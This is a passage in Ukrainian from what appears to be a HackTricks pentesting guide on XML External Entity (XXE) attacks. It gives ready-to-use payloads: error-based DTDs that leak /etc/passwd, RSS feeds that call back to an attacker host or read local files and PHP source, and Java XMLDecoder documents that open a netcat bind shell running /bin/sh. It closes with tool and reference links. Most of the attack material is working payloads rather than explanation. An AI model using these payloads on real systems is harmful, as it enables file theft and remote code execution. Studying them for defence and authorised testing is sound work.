–í–∏—Ç—ñ–∫ –¥–∞–Ω–∏—Ö –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–º–∏–ª–æ–∫ –©–æ–± –ø–æ–¥–æ–ª–∞—Ç–∏ —Ü–µ –æ–±–º–µ–∂–µ–Ω–Ω—è, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø—ñ–¥—Ö—ñ–¥ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–º–∏–ª–æ–∫. –§–∞–π–ª DTD —Å—Ç—Ä—É–∫—Ç—É—Ä–æ–≤–∞–Ω–∏–π –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º, —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø–æ–º–∏–ª–∫—É, —è–∫–∞ –≤–∫–ª—é—á–∞—î –¥–∞–Ω—ñ –∑ —Ü—ñ–ª—å–æ–≤–æ–≥–æ —Ñ–∞–π–ª—É:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
–°–µ—Ä–≤–µ—Ä –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –∑ –ø–æ–º–∏–ª–∫–æ—é, –≤–∞–∂–ª–∏–≤–æ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—á–∏ –Ω–µ—ñ—Å–Ω—É—é—á–∏–π —Ñ–∞–π–ª, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —â–æ —Å–µ—Ä–≤–µ—Ä –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤–∫–∞–∑–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
–©–æ–± –≤–∫–ª—é—á–∏—Ç–∏ –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É –≤ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É, DTD-—Ñ–∞–π–ª –Ω–∞–ª–∞—à—Ç–æ–≤—É—î—Ç—å—Å—è:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
–¶—è –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —É—Å–ø—ñ—à–Ω–æ—ó –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó –≤–º—ñ—Å—Ç—É —Ñ–∞–π–ª—É, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è –≤ –≤–∏—Ö–æ–¥—ñ –ø–æ–º–∏–ª–∫–∏, –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ–º—É —á–µ—Ä–µ–∑ HTTP. –¶–µ –≤–∫–∞–∑—É—î –Ω–∞ —É—Å–ø—ñ—à–Ω—É –∞—Ç–∞–∫—É XXE (XML External Entity), —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —è–∫ Out of Band, —Ç–∞–∫ —ñ Error-Based —Ç–µ—Ö–Ω—ñ–∫–∏ –¥–ª—è –≤–∏—Ç—è–≥–Ω–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.

## RSS - XEE

–î—ñ–π—Å–Ω–∏–π XML —É —Ñ–æ—Ä–º–∞—Ç—ñ RSS –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ XXE.

### Ping back

–ü—Ä–æ—Å—Ç–∏–π HTTP –∑–∞–ø–∏—Ç –¥–æ —Å–µ—Ä–≤–µ—Ä–∞ –∞—Ç–∞–∫—É—é—á–æ–≥–æ
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### –ß–∏—Ç–∞—Ç–∏ —Ñ–∞–π–ª
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### –ß–∏—Ç–∞–Ω–Ω—è –≤–∏—Ö—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É

–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ñ—ñ–ª—å—Ç—Ä–∞ base64 —É PHP
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoder - —Ü–µ –∫–ª–∞—Å Java, —è–∫–∏–π —Å—Ç–≤–æ—Ä—é—î –æ–±'—î–∫—Ç–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ XML-–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è. –Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ –¥–æ–¥–∞—Ç–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –¥–∞–Ω—ñ –≤ –≤–∏–∫–ª–∏–∫—É –º–µ—Ç–æ–¥—É **readObject**, –≤—ñ–Ω –º–∏—Ç—Ç—î–≤–æ –æ—Ç—Ä–∏–º–∞—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ.

### Using Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* –í–∏—Ç—è–≥—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —á–µ—Ä–µ–∑ HTTP, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≤–ª–∞—Å–Ω–∏–π –∑–æ–≤–Ω—ñ—à–Ω—ñ–π DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}
